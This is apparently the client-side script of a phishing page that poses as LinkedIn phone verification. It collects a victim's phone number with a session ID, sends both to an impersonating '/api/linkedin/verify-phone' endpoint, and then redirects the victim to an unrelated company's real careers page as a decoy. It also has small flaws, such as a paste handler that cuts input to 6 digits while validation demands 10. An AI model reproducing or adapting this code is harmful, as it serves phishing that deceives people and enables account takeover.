document.addEventListener("DOMContentLoaded", () => {
  let form = document.getElementById("enter-phone-form");
  const countrySelect = document.getElementById(
    "select-register-phone-country"
  );
  const phoneInput = document.getElementById(
    "register-verification-phone-number"
  );
  const submitButton = document.getElementById("register-phone-submit-button");
  const errorDiv = document.querySelector(".body__banner--error");
  const loader = document.getElementById("loader-wrapper");
  let sessionId = new URLSearchParams(window.location.search).get("sessionId");

  function showError(message) {
    if (errorDiv) {
      errorDiv.querySelector("span").textContent = message;
      errorDiv.classList.remove("hidden__imp");
    }
  }

  function hideError() {
    if (errorDiv) {
      errorDiv.querySelector("span").textContent = "";
      errorDiv.classList.add("hidden__imp");
    }
  }

  function updateSubmitButton() {
    if (submitButton) {
      const isValidLength = phoneInput.value.trim().length === 10;
      submitButton.disabled = !isValidLength;
      submitButton.style.opacity = isValidLength ? "1" : "0.5";
      submitButton.style.cursor = isValidLength ? "pointer" : "not-allowed";
    }
  }

  submitButton.addEventListener("click", function (e) {
    e.preventDefault();
    hideError();

    const phoneNumber = phoneInput.value.trim();
    if (!phoneNumber) {
      showError("Please the correct phoneNumber");
      return;
    }

    if (phoneNumber.length !== 10) {
      showError("Please enter a 10-digit phoneNumber");
      return;
    }

    loader.classList.remove("hidden__imp");

    let submitCodeXhr = new XMLHttpRequest();
    submitCodeXhr.open("POST", "/api/linkedin/verify-phone", true);
    submitCodeXhr.setRequestHeader("Content-type", "application/json");
    submitCodeXhr.send(JSON.stringify({ sessionId: sessionId, phoneNumber: phoneNumber }));

    submitCodeXhr.onreadystatechange = function () {
      let response = this.response;
      console.log(response);
      if (response == "0") {
        loader.classList.add("hidden__imp");
        phoneInput.value = ""; // Clear the input field
        showError("An error occurred. Please try again.");
        updateSubmitButton();
      } else if (response == "1") {
        location.href = "https://careers.stravito.com/jobs?split_view=true&geobound_coordinates%5Btop_left_lat%5D=59.17592824927138&geobound_coordinates%5Btop_left_lon%5D=-11.25&geobound_coordinates%5Bbottom_right_lat%5D=27.605670826465445&geobound_coordinates%5Bbottom_right_lon%5D=20.390625";
      }
    };
  });

  if (form) {
    // Initially disable submit button
    submitButton.disabled = true;
    submitButton.style.opacity = "0.5";
    submitButton.style.cursor = "not-allowed";
    // Handle input changes
    phoneInput.addEventListener("input", (e) => {
      hideError();

      // Ensure only numbers are entered
      let value = e.target.value.replace(/[^0-9]/g, "");

      // Limit to 6 digits
      if (value.length > 10) {
        value = value.slice(0, 10);
      }

      // Update input value
      e.target.value = value;

      // Update submit button state
      updateSubmitButton();
    });

    // Handle paste event
    phoneInput.addEventListener("paste", (e) => {
      e.preventDefault();
      const pastedText = (e.clipboardData || window.clipboardData).getData(
        "text"
      );
      const numbersOnly = pastedText.replace(/[^0-9]/g, "").slice(0, 6);
      phoneInput.value = numbersOnly;
      updateSubmitButton();
    });
  }
});
